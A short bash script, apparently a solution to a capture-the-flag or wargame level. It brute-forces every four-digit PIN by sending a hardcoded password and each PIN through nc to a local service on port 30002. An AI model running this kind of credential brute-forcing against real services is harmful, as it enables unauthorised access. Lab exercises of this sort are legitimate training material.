#!/bin/bash
password="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for a in {0..9}{0..9}{0..9}{0..9}

do
	echo $password' '$a | nc localhost 30002 &
done

	


